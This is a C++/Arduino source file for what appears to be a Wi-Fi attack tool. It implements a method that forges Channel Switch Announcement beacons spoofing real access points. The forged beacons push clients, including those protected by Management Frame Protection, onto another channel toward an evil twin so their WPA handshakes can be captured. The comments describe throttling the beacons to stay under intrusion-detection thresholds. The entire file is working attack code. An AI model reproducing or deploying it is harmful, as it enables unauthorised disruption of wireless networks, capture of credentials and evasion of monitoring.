// CSA-herd capture method: targets PMF-capable APs that OURS skips and PAN
// only grazes. Idea is simple - deauth gets dropped by Management Frame
// Protection, but a forged CSA beacon with a "move to channel N" element
// is still processed by clients because it's a legitimate (if spoofed)
// beacon. We pick a channel far enough from the AP's real one to make
// the client dissociate, then it re-associates against whatever it hears
// first on that channel - our evil-twin if one's running.
//
// We don't try to actually run the twin here - that's net/ap_sta's job.
// This method just herds clients toward whatever channel we tell them.
//
// Throttled to 2 beacons/sec/AP to stay under typical WIDS thresholds and
// to give the radio time to actually hop channels between bursts.
#include "method_ctx.h"
#include "../hc22000.h"
#include "../../core/wsl_bypasser.h"
#include <Arduino.h>
#include <string.h>

namespace Cap {
namespace Methods {

static uint32_t s_lastHerdMs = 0;
static uint8_t  s_herdIdx = 0;

static uint8_t herdChannel(uint8_t apCh) {
    // Jump at least 4 channels away. Clients stuck on overlapping channels
    // do partial-association and re-scan; a clean jump just disassociates
    // them outright. Wrap 1..13 so we always land on a valid one.
    uint8_t target = apCh + 4;
    if (target > 13) target = (uint8_t)(target - 13);
    if (target < 1)  target = 1;
    return target;
}

void resetCsaHerdState() {
    s_lastHerdMs = 0;
    s_herdIdx = 0;
}

void csaHerd(const Ctx& ctx) {
    // No ctx.csaHerd gate here: this is also the "CSA" method's kick().
    // Callers that use it as a pack side-effect already check the flag.
    uint32_t now = millis();
    if (now - s_lastHerdMs < 500) return;
    uint8_t n = ctx.beaconCount;
    if (!n) return;

    // Round-robin so a crowded room doesn't starve the far channels.
    for (uint8_t k = 0; k < n; k++) {
        s_herdIdx = (uint8_t)((s_herdIdx + 1) % n);
        BeaconSlot& b = ctx.beacons[s_herdIdx];
        if (b.channel != ctx.channel) continue;
        if (ctx.isOwnAp(b.bssid)) continue;
        if (ctx.skipPin(b.bssid)) continue;
        if (ctx.isSkipped && ctx.isSkipped(b.bssid)) continue;
        if (b.rssi < ctx.minRssi) continue;
        if (!b.ssid[0]) continue;             // hidden SSID - CSA with empty SSID is suspicious
        if (Hc22000::hasHandshake(b.bssid, ctx.hsDepth)) continue;

        // PMF-capable is the prime target - OURS/PAN can't touch those.
        // Non-PMF still benefits from CSA as a fallback kick.
        WSLBypasser::sendCSABeacon(b.bssid, b.ssid,
                                   b.channel, herdChannel(b.channel), 3);
        (*ctx.framesDeauth)++;
        s_lastHerdMs = now;
        return; // one AP per tick - keeps the airtime budget sane
    }
}

CAP_METHOD_REGISTER("HERD", csaHerd, nullptr, resetCsaHerdState)

} // namespace Methods
} // namespace Cap